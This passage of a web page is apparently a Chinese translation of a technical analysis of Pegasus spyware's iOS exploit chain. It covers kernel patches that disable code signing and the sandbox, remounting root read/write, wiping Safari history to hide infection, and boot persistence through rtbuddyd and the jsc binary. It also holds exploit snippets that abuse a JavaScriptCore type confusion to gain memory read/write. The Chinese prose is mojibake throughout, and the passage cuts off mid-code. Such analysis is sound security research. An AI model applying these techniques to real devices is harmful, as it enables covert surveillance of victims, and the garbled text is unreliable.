ç­¾ååŠŸèƒ½ã€‚<code>com.apple.driver.LightweightVolumeManager</code>æ‰©å±•è´Ÿè´£ä¸»å­˜å‚¨è®¾å¤‡çš„åˆ†åŒºè¡¨ã€‚é˜¶æ®µ2é€šè¿‡è°ƒç”¨OSKextCopyLoadedKextInfoæ¥å®šä½æ¯ä¸ªæ‰©å±•ï¼Œè¯¥å‡½æ•°è¿”å›å«æœ‰æ‰©å±•ä¿¡æ¯çš„å­—å…¸å¯¹è±¡ã€‚åœ¨å­—å…¸ä¸­çš„æ˜¯å½“æ‰©å±•è¢«è°ƒç”¨æ—¶çš„åŠ è½½åç§»é‡ï¼Œé˜¶æ®µäºŒé€šè¿‡æ·»åŠ ä¸€å·²çŸ¥çš„åç§»é‡å°†å…¶æ”¾å…¥å†…æ ¸åœ°å€ä¸­ã€‚</p><p>ä½¿ç”¨AMFIçš„å†…æ ¸åœ°å€ï¼Œé˜¶æ®µ2å®šä½ä»¥ä¸‹å…¨å±€å˜é‡ï¼š<br><code>amfi_get_out_of_my_way</code><br><code>cs_enforcement_disable</code><br>è¿™ä¸¤ä¸ªå˜é‡åœ¨è®¾ç½®å¥½åä¼šç¦ç”¨AFMIå¹¶ç¦ç”¨ä»£ç ç­¾åã€‚ç„¶åï¼Œé˜¶æ®µ2è®¾ç½®å¦å¤–ä¸¤ä¸ªå…¨å±€å˜é‡ï¼šdebug _ flagså’ŒDEBUGflagã€‚ è¿™ä¸¤ä¸ªå˜é‡å…è®¸å¯¹å—å®³è€…çš„iPhoneè¿›è¡Œè°ƒè¯•æƒé™ï¼Œè¿›ä¸€æ­¥å‡å°‘æ²™ç®±ï¼ˆSEATBELTï¼‰å¯¹è®¾å¤‡æ–½åŠ çš„é™åˆ¶ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œç¬¬2é˜¶æ®µä¿®æ”¹å†…æ ¸å‡½æ•°<code>vm_map_enter</code>å’Œ<code>vm_map_protect</code>ï¼Œä»¥ä¾¿åœ¨è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨ä¸­ç¦ç”¨ä»£ç ç­¾åéªŒè¯ï¼ˆå¯ä»¥åˆ†é…RWXåŒºåŸŸï¼‰ã€‚åœ¨æ­¤ä¹‹åï¼Œç¬¬2é˜¶æ®µä¿®æ”¹LightweightVolumeManagerä¸­çš„<code>_mapForIO</code>å‡½æ•°ï¼Œç„¶åä¿®æ”¹å†…æ ¸å‡½æ•°csopsä»¥ç¦ç”¨æ›´å¤šçš„ä»£ç ç­¾åä¿æŠ¤ã€‚</p><h3 id="é‡æ–°å®‰è£…é©±åŠ¨å™¨"><a href="#é‡æ–°å®‰è£…é©±åŠ¨å™¨" class="headerlink" title="é‡æ–°å®‰è£…é©±åŠ¨å™¨"></a>é‡æ–°å®‰è£…é©±åŠ¨å™¨</h3><p>ä¸ºäº†è¶Šç‹±è®¾å¤‡ï¼Œå¿…é¡»æ‹¥æœ‰æ ¹æ–‡ä»¶ç³»ç»Ÿå†™æƒé™ã€‚é˜¶æ®µ2é€šè¿‡å¯¹<code>/ sbin / launchd</code>è°ƒç”¨è®¿é—®å‡½æ•°æ¥æµ‹è¯•æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å¯å†™æ€§ï¼Œä»¥ç¡®å®šé˜¶æ®µ2æ˜¯å¦å…·æœ‰å¯¹æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å†™è®¿é—®æƒã€‚å¦‚æœæ–‡ä»¶æ˜¯åªè¯»çš„ï¼Œåˆ™ç¬¬2é˜¶æ®µä¿®è¡¥å†…æ ¸å‡½æ•°<code>_ mac _ mount</code>ä»¥ç¦ç”¨ä¿æŠ¤ç­–ç•¥ï¼Œè¯¥ç­–ç•¥é˜»æ­¢å°†æ–‡ä»¶ç³»ç»Ÿé‡æ–°å®‰è£…ä¸ºè¯»/å†™ï¼Œç„¶åé€šè¿‡è°ƒç”¨<code>mount(â€œhfsâ€, â€œ/â€, MNT _ UPDATE ,mountData)</code>å°†rootæ–‡ä»¶ç³»ç»Ÿé‡æ–°å®‰è£…ä¸ºè¯»/å†™ï¼Œå…¶ä¸­mountDataæŒ‡å®š<code>/ dev / disk0s1s1</code>è®¾å¤‡ã€‚</p><p>å¦‚æ­¤ç¼–å†™ä½¿å¾—å®ƒåªèƒ½åœ¨iOS 9ç³»åˆ—iPhoneä¸Šè¿è¡Œï¼Œä½†ä»£ç å­˜åœ¨è¡¨æ˜å®ƒæ›¾ç»åœ¨è¾ƒæ—§çš„iOSç‰ˆæœ¬ä¸Šä½¿ç”¨è¿‡ã€‚ä½œä¸ºæ”¯æŒæ­¤å£°æ˜çš„è¯æ®ï¼Œåœ¨ç¬¬2é˜¶æ®µé‡æ–°å®‰è£…æ ¹æ–‡ä»¶ç³»ç»Ÿåä¼šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœå®ƒåœ¨iOS 7ï¼ŒiOS 8æˆ–iOS 9ä¸Šè¿è¡Œï¼Œåˆ™ä¿®æ”¹å…¶æ‰§è¡Œè·¯å¾„ã€‚æ ¹æ®iOSç‰ˆæœ¬ï¼Œå‡½æ•°åœ¨<code>/ bin / launchctl</code>ï¼ˆé€‚ç”¨äºiOS 7å’Œ8ï¼‰æˆ–<code>/ bin / launchd</code>ï¼ˆé€‚ç”¨äºiOS 9ï¼‰ä¸Šè°ƒç”¨<code>fsctl</code>ã€‚<code>fsctl</code>å°†ä¿®æ”¹ä½ç£ç›˜ç©ºé—´è­¦å‘Šé˜ˆå€¼ä»¥åŠæä½ç£ç›˜ç©ºé—´è­¦å‘Šé˜ˆå€¼ï¼Œåˆ†åˆ«å°†å€¼è®¾ç½®ä¸º8192å’Œ8208ã€‚</p><h3 id="æ¸…ç†"><a href="#æ¸…ç†" class="headerlink" title="æ¸…ç†"></a>æ¸…ç†</h3><p>ç”±äºSafariä¸­å…è®¸ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œç¬¬2é˜¶æ®µè¢«æ¿€æ´»ã€‚ä½œä¸ºç¬¬2é˜¶æ®µåœ¨å®ç°è¶Šç‹±ä¹‹å‰æ‰§è¡Œçš„æœ€åä¸€é¡¹æ´»åŠ¨ä¹‹ä¸€ï¼Œç¬¬2é˜¶æ®µå°è¯•é€šè¿‡æ¸…ç†Safariä¸­çš„å†å²è®°å½•å’Œç¼“å­˜æ–‡ä»¶æ¥è¦†ç›–å…¶æ„ŸæŸ“å‘é‡ã€‚æ¸…é™¤Safariæµè§ˆå™¨å†å²è®°å½•å’Œç¼“å­˜æ–‡ä»¶çš„è¿‡ç¨‹éå¸¸ç®€å•ï¼Œå¹¶ä¸”ç‰¹å®šäºiOSç‰ˆæœ¬ã€‚</p><p>å¯¹äºiOS 8å’ŒiOS 9ï¼ˆå¦‚æœæœªåœ¨iOS 9ä¸Šè¿è¡Œï¼Œç¬¬2é˜¶æ®µå°†åœ¨å¼€å§‹æ—¶ç»ˆæ­¢ï¼‰ï¼Œå°†ä»å—å®³è€…çš„iPhoneä¸­ç«‹å³åˆ é™¤ä»¥ä¸‹æ–‡ä»¶ä»¥åˆ é™¤æµè§ˆå™¨å’Œç¼“å­˜ä¿¡æ¯ï¼š</p><pre><code>â€¢ /Library/Safari/SuspendState.plistâ€¢ /Library/Safari/History.dbâ€¢ /Library/Safari/History.db-shmâ€¢ /Library/Safari/History.db-walâ€¢ /Library/Safari/History.db-journalâ€¢ /Library/Caches/com.apple.mobilesafari/Cache.dbâ€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-shmâ€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-walâ€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-journalâ€¢ (files in the directory) /Library/Caches/com.apple.mobilesafari/fsCachedData/</code></pre><p>å¯¹äºiOS 7ï¼Œå°†åˆ é™¤ä»¥ä¸‹æ–‡ä»¶ï¼š</p><pre><code>â€¢ /Library/Caches/com.apple.mobilesafari/Cache.dbâ€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-shmâ€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-walâ€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-journal</code></pre><p>æœ€åè°ƒç”¨<code>sync</code>ï¼Œä»¥ç¡®ä¿å°†åˆ é™¤å†™å…¥ç£ç›˜ã€‚</p><h3 id="ä¸‹ä¸€é˜¶æ®µå®‰è£…"><a href="#ä¸‹ä¸€é˜¶æ®µå®‰è£…" class="headerlink" title="ä¸‹ä¸€é˜¶æ®µå®‰è£…"></a>ä¸‹ä¸€é˜¶æ®µå®‰è£…</h3><p>å†æ¬¡ç»™å‡ºä½¿ç”¨æœ€åˆé’ˆå¯¹è¾ƒæ—§çš„iOSç‰ˆæœ¬çš„ä»£ç çš„è¯æ®ï¼Œä¸»çº¿ç¨‹è°ƒç”¨çš„ä¸‹ä¸€ä¸ªå‡½æ•°è¿›è¡Œè§£å‹ç¼©å¹¶å°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°å—å®³è€…çš„æ–‡ä»¶ç³»ç»Ÿä¸Šã€‚ä»¥ä¸‹ä»£ç æ®µè¯´æ˜äº†Stage 2å¦‚ä½•ç¡®å®šè¶Šç‹±äºŒè¿›åˆ¶æ–‡ä»¶åœ¨å—å®³è€…è®¾å¤‡ä¸Šçš„ä½ç½®ï¼š</p><pre><code>if ( ( unsigned int) ( majorVersion -8 )){    if ( majorVersion ==7 ){        pszJBFilenamePath = &quot;/bin/sh&quot;;        if( flag )            pszJBFilenamepath = &quot;/private/var/tmp/jb-install&quot;;    }    else{        assert();        writeLog(3, &quot;%.2s%5.5d\n&quot;, &quot;bh.c&quot;, 134);        exit(-1);        pszJBFilenamePath =0;    }}else{    pszJBFilenamePath = &quot;/sbin/mount_nfs.temp&quot;;}</code></pre><p>ä»£ç ç‰‡æ®µæ˜¾ç¤ºï¼Œå¯¹äºiOSç‰ˆæœ¬7ï¼Œä¸‹ä¸€é˜¶æ®µäºŒè¿›åˆ¶æ–‡ä»¶çš„å®‰è£…è·¯å¾„æ˜¯<code>/ bin / sh</code>æˆ–<code>/ private / var / tmp / jb-install</code>ï¼ˆå¦‚æœflagä¸ºéé›¶ï¼‰ã€‚å¯¹äºæ—©äº7çš„iOSç‰ˆæœ¬ï¼Œå°†è°ƒç”¨æ–­è¨€å›è°ƒå¹¶ç»ˆæ­¢ç¨‹åºã€‚ å¯¹äºiOS 8åŠæ›´é«˜ç‰ˆæœ¬ï¼Œå®‰è£…è·¯å¾„æŒ‡å®šä¸º<code>/ sbin / mount _ nfs.temp</code>ã€‚</p><p>åŒ…å«ä¸‹ä¸€é˜¶æ®µäºŒè¿›åˆ¶çš„æ•°æ®blobçš„å¤§å°è¢«éªŒè¯ä¸ºéé›¶ã€‚å¦‚æœå¤§å°ä¸ºé›¶ï¼Œåˆ™å‘ç”Ÿæ–­è¨€å›è°ƒå¹¶ç»ˆæ­¢ç¬¬2é˜¶æ®µã€‚ç„¶åï¼Œé˜¶æ®µ2ä½¿ç”¨<code>BZ2 _ *</code> APIå‡½æ•°å°†æ•°æ®è§£å‹ç¼©ä¸ºä¸¤ä¸ªæ–‡ä»¶ï¼šç¬¬ä¸€ä¸ªæ–‡ä»¶æ˜¯ä¸‹ä¸€ä¸ªé˜¶æ®µçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯¹äºiOS 9ï¼Œå®ƒå­˜å‚¨åœ¨<code>/ sbin / mount _ nfs.temp</code>ä¸­ã€‚ ç¬¬äºŒä¸ªæ–‡ä»¶æ˜¯é…ç½®æ–‡ä»¶ï¼Œå­˜å‚¨åœ¨<code>/ private / var / tmp / jb _ cfg</code>ä¸­ã€‚</p><p>åœ¨æ§åˆ¶è¿”å›ä¸»çº¿ç¨‹ä¹‹å‰ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶çš„æƒé™æ›´æ”¹ä¸º<code>0755</code>ï¼ˆä½¿æ–‡ä»¶å¯æ‰§è¡Œï¼‰ã€‚</p><p>Stage 2åœ¨ç»ˆæ­¢ä¹‹å‰è°ƒç”¨çš„æœ€ç»ˆå‡½æ•°è´Ÿè´£ç§»åŠ¨ä¸Šä¸€æ­¥éª¤ä¸­æ”¾ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å¯¹äºiOSç‰ˆæœ¬8å’Œ9ï¼Œæ–‡ä»¶<code>/ sbin / mount _ nfs.temp</code>é‡å‘½åä¸º<code>/ sbin / mount _ nfs</code>ã€‚å¦‚æœå—å®³è€…æ‰‹æœºä¸Šçš„iOSæ˜¯iOS 9ï¼Œåˆ™ä¼šåœ¨é‡å‘½åæ“ä½œä¹‹å‰å°è¯•åˆ é™¤<code>/ sbin / mount _ nfs</code>ã€‚é‡å‘½åæ–‡ä»¶åï¼Œè°ƒç”¨assertå›è°ƒå‡½æ•°ï¼Œç„¶åè°ƒç”¨exitå‡½æ•°ï¼Œç»ˆæ­¢Stage 2ã€‚</p><p>ä¸€æ—¦æ‰§è¡Œè¿”å›ä¸»çº¿ç¨‹ï¼Œç¬¬2é˜¶æ®µå°†ä»¥é™é»˜æ–¹å¼ç»ˆæ­¢</p><h3 id="ç°æœ‰çš„è¶Šç‹±æ£€æµ‹"><a href="#ç°æœ‰çš„è¶Šç‹±æ£€æµ‹" class="headerlink" title="ç°æœ‰çš„è¶Šç‹±æ£€æµ‹"></a>ç°æœ‰çš„è¶Šç‹±æ£€æµ‹</h3><p>å¦‚å‰æ‰€è¿°ï¼ŒStage 2äºŒè¿›åˆ¶æ–‡ä»¶ä»¥ä¸¤ç§ä¸åŒçš„æ¨¡å¼è¿è¡Œã€‚ç¬¬ä¸€ä¸ªå·²ç»è®¨è®ºè¿‡ï¼Œå…¶æ„æˆäº†ä¸€ä¸ªå®Œæ•´çš„iOSæ¼æ´åˆ©ç”¨å’Œè¶Šç‹±ã€‚ ç¬¬äºŒä¸ªæ˜¯åœ¨å·²ç»è¶Šç‹±çš„ç³»ç»Ÿä¸Šè¿è¡ŒStage 2äºŒè¿›åˆ¶æ–‡ä»¶æ—¶æ‰€é‡‡ç”¨ç­–ç•¥ã€‚åœ¨ç¬¬äºŒæ¨¡å¼ä¸‹ï¼Œç¬¬2é˜¶æ®µåªæ˜¯åˆ©ç”¨ç°æœ‰çš„è¶Šç‹±åé—¨æ¥å®‰è£…Pegasusç‰¹å®šçš„å†…æ ¸è¡¥ä¸ã€‚</p><p>ä¸ºäº†ç¡®å®šè®¾å¤‡æ˜¯å¦å·²ç»è¶Šç‹±ï¼Œç¬¬2é˜¶æ®µå°è¯•åˆ©ç”¨å¸¸è§çš„è¶Šç‹±åé—¨è·å–è¿›å…¥iOSå†…æ ¸çš„æœ‰æ•ˆæœºå™¨ç«¯å£ã€‚åªéœ€é€šè¿‡è°ƒç”¨<code>task _ for _ pid</code>å¹¶å°†PIDå€¼è®¾ç½®ä¸º0æ¥æ‰§è¡Œæ­¤æ£€æŸ¥ã€‚ ä¿®æ”¹<code>task _ for _ pid</code>æ˜¯iOSè¶Šç‹±ä½¿ç”¨çš„å¸¸è§åé—¨æœºåˆ¶ï¼Œå®ƒä½¿ç”¨æˆ·æ¨¡å¼è¿›ç¨‹æœ‰ç›´æ¥å†…æ ¸å†…å­˜è®¿é—®çš„æƒåŠ›ã€‚iOSé€šå¸¸ä¸å…è®¸ä½¿ç”¨PIDä¸º0çš„<code>task _ for _ pid</code>ã€‚å¦‚æœ<code>task _ for _ pid</code>è¿”å›æœ‰æ•ˆçš„ä»»åŠ¡ç«¯å£ï¼ŒStage 2è¿›ç¨‹å°±å¯ä»¥æå‡å¯¹å†…æ ¸çš„è®¿é—®æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ”¾å¼ƒå‰é¢æè¿°çš„æƒé™æå‡æ­¥éª¤ã€‚</p><p>é˜¶æ®µ2è¿˜æ£€æŸ¥<code>/ bin / sh</code>åœ¨ä¸åœ¨ã€‚åœ¨æœªè¶Šç‹±æ‰‹æœºä¸Šï¼Œè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ°¸è¿œä¸åº”è¯¥å­˜åœ¨ã€‚å½“é˜¶æ®µ2æ£€æµ‹åˆ°æ­¤äºŒè¿›åˆ¶æ–‡ä»¶çš„å­˜åœ¨æ—¶ï¼Œå®ƒå‡å®šç°æœ‰çš„è¶Šç‹±ç¨‹åºä¸Pegasusä¸å…¼å®¹æˆ–è€…æ‰€æœ‰å¿…éœ€çš„å†…æ ¸è¡¥ä¸å·²ç»åˆ°ä½å¹¶ä¸”ä¸éœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œã€‚å½“åœ¨è®¾å¤‡ä¸Šå­˜åœ¨<code>/ bin / sh</code>æ—¶ï¼Œé˜¶æ®µ2ä¸ç”¨è¿›è¡Œæ”»å‡»ç›´æ¥é€€å‡ºå³å¯ã€‚</p><h2 id="å››ï¼šPegasusæŒä¹…æ€§æœºåˆ¶"><a href="#å››ï¼šPegasusæŒä¹…æ€§æœºåˆ¶" class="headerlink" title="å››ï¼šPegasusæŒä¹…æ€§æœºåˆ¶"></a>å››ï¼šPegasusæŒä¹…æ€§æœºåˆ¶</h2><p>æœ¬èŠ‚è¯¦ç»†ä»‹ç»äº†Pegasusé€šè¿‡Tridentæ¼æ´è¿›è¡Œæ”»å‡»åä¿ç•™åœ¨è®¾å¤‡ä¸Šçš„æŒä¹…æ€§æœºåˆ¶ï¼Œå¹¶åœ¨æ¯æ¬¡è®¾å¤‡é‡æ–°å¯åŠ¨æ—¶ç»§ç»­æ‰§è¡Œæœªç­¾åçš„ä»£ç ã€‚</p><h3 id="PegasusæŒä¹…æ€§æœºåˆ¶"><a href="#PegasusæŒä¹…æ€§æœºåˆ¶" class="headerlink" title="PegasusæŒä¹…æ€§æœºåˆ¶"></a>PegasusæŒä¹…æ€§æœºåˆ¶</h3><p>Pegasusä½¿ç”¨çš„æŒä¹…æ€§æœºåˆ¶åœ¨æ¯æ¬¡è®¾å¤‡å¯åŠ¨æ—¶å¯é åœ°æ‰§è¡Œæœªç­¾åçš„ä»£ç ï¼ˆå¹¶æœ€ç»ˆæ‰§è¡Œå†…æ ¸æ¼æ´ä»¥å†æ¬¡è¶Šç‹±è®¾å¤‡ï¼‰ä¾èµ–äºä¸¤ä¸ªä¸åŒé—®é¢˜çš„ç»„åˆã€‚</p><p>ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯<code>plist</code>ä¸­å­˜åœ¨<code>rtbuddyd</code>æœåŠ¡ï¼ˆåœ¨è®¾å¤‡å¯åŠ¨æ—¶å¯åŠ¨ï¼‰ã€‚è¯·æ³¨æ„ï¼Œåœ¨iOS 10ä¹‹å‰ï¼Œrtbuddydå­˜åœ¨äºæŸäº›iPhoneè®¾å¤‡ä¸Šï¼Œä¾‹å¦‚iPhone 6Sï¼Œä½†ä¸å­˜åœ¨äº<code>iPhone 6</code>ç­‰å…¶ä»–è®¾å¤‡ä¸Šã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥å¤åˆ¶åˆ°æŒ‡å®šè·¯å¾„ï¼ˆ<code>/ usr / libexec / rtbuddyd</code>ï¼‰çš„å·²ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶éƒ½å°†åœ¨å¼•å¯¼æ—¶ä½¿ç”¨plistä¸­æŒ‡å®šçš„å‚æ•°ï¼ˆç‰¹åˆ«æ˜¯â€œ<code>--early-boot</code>â€ï¼‰æ‰§è¡Œã€‚</p><pre><code>&lt;key&gt; rtbuddy&lt;/key&gt;&lt;dict&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;rtbuddy&lt;/string&gt;&lt;string&gt;--early-boot&lt;/string&gt;&lt;/array&gt;&lt;key&gt;PerformInRestore&lt;/key&gt;&lt;true/&gt;&lt;key&gt;RequireSucess&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;/usr/libexec/rtbuddy&lt;/string&gt;&lt;/dict&gt;</code></pre><p>ç”±äºæ­¤è¡Œä¸ºï¼Œç³»ç»Ÿä¸Šçš„ä»»ä½•å·²ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶éƒ½å¯ä»¥åœ¨å¼•å¯¼æ—¶ä½¿ç”¨å•ä¸ªå‚æ•°æ‰§è¡Œã€‚é€šè¿‡åœ¨å½“å‰å·¥ä½œç›®å½•ä¸­åˆ›å»ºåä¸º<code>--early-boot</code>çš„ç¬¦å·é“¾æ¥ï¼Œå¯ä»¥å°†ä»»æ„æ–‡ä»¶ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™å·²å¤åˆ¶åˆ°<code>rtbuddyd</code>ä½ç½®çš„ä»»æ„å·²ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>æ­¤æŒä¹…æ€§æœºåˆ¶ä¸­åˆ©ç”¨çš„ç¬¬äºŒä¸ªé—®é¢˜æ˜¯JavaScriptCoreäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ¼æ´ã€‚Pegasusåˆ©ç”¨å‰é¢æè¿°çš„æ–¹æ³•ï¼Œé€šè¿‡å°†æ–‡ä»¶å¤åˆ¶åˆ°<code>/ usr / libexec / rtbuddyd</code>æ¥æ‰§è¡ŒjscäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆJavaScriptCoreï¼‰ã€‚ç„¶åå¯ä»¥é€šè¿‡åˆ›å»ºåä¸º<code>--early-boot</code>çš„ç¬¦å·é“¾æ¥æ¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œè¯¥ç¬¦å·é“¾æ¥æŒ‡å‘è¦åœ¨å¼•å¯¼æ—¶æ‰§è¡Œçš„ä»£ç æ–‡ä»¶ã€‚ç„¶åPegasusåˆ©ç”¨jscäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„é”™è¯¯è½¬æ¢æ¥æ‰§è¡Œæœªç­¾åçš„ä»£ç å¹¶é‡æ–°åˆ©ç”¨å†…æ ¸ã€‚</p><h3 id="JavaScriptCoreå†…å­˜æŸåé—®é¢˜"><a href="#JavaScriptCoreå†…å­˜æŸåé—®é¢˜" class="headerlink" title="JavaScriptCoreå†…å­˜æŸåé—®é¢˜"></a>JavaScriptCoreå†…å­˜æŸåé—®é¢˜</h3><p>è¯¥é—®é¢˜å­˜åœ¨äºJavaScriptç»‘å®šçš„<code>setImpureGetterDelegateï¼ˆï¼‰</code>ä¸­ï¼ˆç”±<code>functionSetImpureGetterDelegate</code>æ”¯æŒï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EncodeJSValue JSC_HOST_CALL <span class="title">functionSetImpureGetterDelegate</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">JSLockHolder <span class="title">lock</span><span class="params">(exec)</span></span>;</span><br><span class="line">JSValue base = exec-&gt;argument(<span class="number">0</span>)ï¼›</span><br><span class="line"><span class="keyword">if</span>(!base.isObject())</span><br><span class="line"><span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">JSValue delegate =exec-&gt;argument(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!delegate.isObject())</span><br><span class="line"><span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">ImpureGetter* impureGetter = jsCast&lt;ImpureGetter*&gt;(asObject(base.asCell()));</span><br><span class="line">impureGetter-&gt;setDelegate(exec-&gt;vm(), asObject(delegate.asCell()));</span><br><span class="line"><span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»‘å®šæœ‰ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªæ˜¯ImpureGetterï¼Œç¬¬äºŒä¸ªæ˜¯å°†è¢«è®¾ç½®ä¸ºImpureGetter delegateçš„é€šç”¨JSObjectã€‚è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºç¼ºä¹éªŒè¯ï¼ŒJSObjectä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ ¼å¼æ­£ç¡®çš„ImpureGetterã€‚å½“å¦ä¸€ä¸ªå¯¹è±¡ç±»å‹ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’æ—¶ï¼Œå¯¹è±¡æŒ‡é’ˆå°†ä¸æ­£ç¡®åœ°å‘ä¸‹è½¬æ¢ä¸ºImpureGetteræŒ‡é’ˆã€‚</p><p>éšåï¼Œå½“é€šè¿‡<code>setDelegateï¼ˆ)</code>è®¾ç½®<code>m_delegate</code>æ—¶ï¼ŒæŒ‡å‘ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ é€’çš„JSObjectçš„æŒ‡é’ˆå°†å†™å…¥ä¸<code>m_delegate</code>å¯¹é½çš„åç§»é‡ï¼ˆ16ä¸ªå­—èŠ‚åˆ°æä¾›çš„å¯¹è±¡ä¸­ï¼‰ã€‚æ­¤é—®é¢˜å¯ç”¨äºåˆ›å»ºä¸€ä¸ªåŸè¯­ï¼Œå…è®¸å°†æŒ‡å‘ä»»æ„JSObjectçš„æŒ‡é’ˆå†™å…¥16ä¸ªå­—èŠ‚åˆ°ä»»ä½•å…¶ä»–JSObjectä¸­ã€‚</p><h3 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><p>Pegasusåˆ©ç”¨æ­¤é—®é¢˜åœ¨iOSåº”ç”¨ç¨‹åºæ‰§è¡Œæ—¶å®ç°æœªç­¾åä»£ç æ‰§è¡Œã€‚ä¸ºäº†è·å¾—å¯¹æ‰§è¡Œæµç¨‹çš„æ§åˆ¶ï¼Œè¯¥æ”»å‡»åˆ©ç”¨äº†è®¸å¤š<code>DataView</code>å¯¹è±¡ã€‚ä½¿ç”¨<code>DataView</code>æ˜¯å› ä¸ºå®ƒä»¬æä¾›äº†ä¸€ç§ç®€å•çš„æœºåˆ¶æ¥è¯»å–å’Œå†™å…¥å‘é‡ä¸­çš„ä»»æ„åç§»é‡ã€‚DataViewå¯¹è±¡åœ¨16å­—èŠ‚åç§»å¤„æœ‰ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚åˆ©ç”¨è¿™äº›æŸåçš„DataViewå¯¹è±¡ï¼Œæ¼æ´åˆ©ç”¨ç¨‹åºå®‰è£…è·å–ä»»æ„æœ¬æœºä»£ç æ‰§è¡Œæƒæ‰€éœ€çš„å·¥å…· - å³è¯»/å†™åŸè¯­ä»¥åŠæš´éœ²ä»»æ„JavaScriptå¯¹è±¡åœ°å€ã€‚å®Œæˆæ­¤è®¾ç½®åï¼Œæ¼æ´åˆ©ç”¨ç¨‹åºå°±å¯ä»¥åˆ›å»ºåŒ…å«æœ¬æœºä»£ç payloadçš„å¯æ‰§è¡Œæ˜ å°„ã€‚ ä»¥ä¸‹éƒ¨åˆ†è¯¦ç»†ä»‹ç»äº†æ­¤è¿‡ç¨‹çš„å„ä¸ªé˜¶æ®µã€‚</p><h4 id="è·å–ä»»æ„è¯»-å†™åŸè¯­"><a href="#è·å–ä»»æ„è¯»-å†™åŸè¯­" class="headerlink" title="è·å–ä»»æ„è¯»/å†™åŸè¯­"></a>è·å–ä»»æ„è¯»/å†™åŸè¯­</h4><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ç‰‡æ®µè·å–ç”¨äºDataViewå¯¹è±¡çš„ä»»æ„åç§»é‡çš„è¯»/å†™åŸè¯­ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer(<span class="number">0x20</span>);</span><br><span class="line">var dataview_init_rw = <span class="keyword">new</span> DataView(dummy_ab);</span><br><span class="line">...</span><br><span class="line">var dataview_rw = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDalagate(dataview_init_rw, dataview_rw);</span><br></pre></td></tr></table></figure></p><p>é¦–å…ˆï¼Œä½¿ç”¨è™šæ‹Ÿ<code>ArrayBuffer</code>ä½œä¸ºä¸¤è€…çš„åå¤‡å‘é‡åˆ›å»ºä¸¤ä¸ªDataViewã€‚æ¥ä¸‹æ¥ï¼Œåˆ©ç”¨æŒ‡å‘<code>dataview_rw</code>çš„æŒ‡é’ˆæ¥åˆ©ç”¨è¯¥é—®é¢˜æ¥ç ´å<code>dataview_init_rw</code>çš„<code>m_vector</code>æˆå‘˜ã€‚å¯¹<code>dataview_init_rw</code> åç»­è¯»å–å’Œå†™å…¥ï¼ŒDataViewä¼šè®©dataview_rwçš„ä»»ä¸€æˆå‘˜æ³„éœ²æˆ–é‡å†™ã€‚æ¥ä¸‹æ¥ï¼Œå¯¹è¯¥å¯¹è±¡çš„æ§åˆ¶ç”¨äºè·å¾—æ•´ä¸ªè¿›ç¨‹å­˜å‚¨å™¨çš„è¯»/å†™åŸè¯­ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 